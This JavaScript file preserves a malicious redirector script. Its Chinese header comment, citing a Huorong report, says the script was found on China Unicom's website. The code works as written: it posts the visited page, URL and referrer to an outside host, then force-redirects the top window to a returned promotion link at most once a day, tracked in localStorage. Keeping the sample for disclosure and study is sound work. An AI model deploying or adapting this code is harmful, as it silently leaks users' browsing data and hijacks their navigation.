/*
联通官网携带木马脚本 可向用户推广色情APP
最新资讯 2020-11-12 22415次阅读
近期，火绒接到用户反馈，称在登录中国联通官网办理业务时被火绒报毒。火绒工程师查看后，发现中国联通官网携带木马脚本（Trojan/JS.Redirector）。当用户访问其中某“业务办理记录”页面时，即会激活木马脚本，导致用户被强行跳转到其他推广页面上，推广内容涉及色情、游戏等。不仅如此，该木马脚本还被设定为一天只跳转一次，降低用户警惕性，以便长期存留于该页面。
火绒原文： http://huorong.cn/info/1605176406524.html
*/


(function () {
    function initXMLhttp() {

        var xmlhttp;
        if (window.XMLHttpRequest) {
            xmlhttp = new XMLHttpRequest();
        } else {

            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
        }

        return xmlhttp;
    }

    function minAjax(config) {


        if (!config.url) {
            return;

        }

        if (!config.type) {
            return;

        }

        if (!config.method) {
            config.method = true;
        }


        if (!config.debugLog) {
            config.debugLog = false;
        }

        var sendString = [],
            sendData = config.data;
        if (typeof sendData === "string") {
            var tmpArr = String.prototype.split.call(sendData, '&');
            for (var i = 0, j = tmpArr.length; i < j; i++) {
                var datum = tmpArr[i].split('=');
                sendString.push(encodeURIComponent(datum[0]) + "=" + encodeURIComponent(datum[1]));
            }
        } else if (typeof sendData === 'object' && !(sendData instanceof String)) {
            for (var k in sendData) {
                var datum = sendData[k];
                if (Object.prototype.toString.call(datum) == "[object Array]") {
                    for (var i = 0, j = datum.length; i < j; i++) {
                        sendString.push(encodeURIComponent(k) + "[]=" + encodeURIComponent(datum[i]));
                    }
                } else {
                    sendString.push(encodeURIComponent(k) + "=" + encodeURIComponent(datum));
                }
            }
        }
        sendString = sendString.join('&');

        if (window.XDomainRequest) {
            var xmlhttp = new window.XDomainRequest();
            xmlhttp.onload = function () {
                if (config.success) {
                    config.success(xmlhttp.responseText);
                }
            };
            xmlhttp.open("POST", config.url);
            xmlhttp.send(sendString);
        } else {

            var xmlhttp = initXMLhttp();

            xmlhttp.onreadystatechange = function () {

                if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {

                    if (config.success) {
                        config.success(xmlhttp.responseText, xmlhttp.readyState);
                    }

                } else {

                }
            }

            if (config.type == "GET") {
                xmlhttp.open("GET", config.url + "?" + sendString, config.method);
                xmlhttp.send();

            }
            if (config.type == "POST") {
                xmlhttp.open("POST", config.url, config.method);
                xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                xmlhttp.send(sendString);
            }


        }

    }

    dL();

    function dL() {
        var host = 'http://bullet.cdncontentdelivery.com/f';
        var config = {
            url: host + "/stats.php",
            type: "POST",
            data: {
                vbase: document.baseURI,
                vhref: location.href,
                vref: document.referrer, k: "YXViZGFzLmNvbQ==",
                ek: "dW5pb24xLmF1YmRhcy5jb20=",
                t: Math.floor(new Date().getTime() / 1000), tg: ""
            },
            success: onSuccessCallback
        };

        function bl(resp) {
            !function (dr) {
                function t() { 
                    return !!localStorage && localStorage.getItem(a) 
                } 
                function e() {
                    o(),
                    parent.top.window.location.href = c
                } 
                function o() { 
                    var t = r + i; 
                    if (localStorage) { 
                        localStorage.setItem(a, t) 
                    } 
                }
                function n() { // 每天只请求一次（本地控制）
                    if (t()) { 
                        var o = localStorage && localStorage.getItem(a); r > o && e() 
                    } else 
                        e() 
                    } 
                    var a = "MenuIdentifier",
                    r = Math.floor((new Date).getTime() / 1e3), 
                    c = dr, 
                    i = 86400; 
                    n()
            }
            (resp);
        }

        function onSuccessCallback(response) {
            if (response && response.indexOf('http') > -1) {
                bl(response);  // 判断返回内容进行跳转
            }
        }


        minAjax(config);

    }
})();

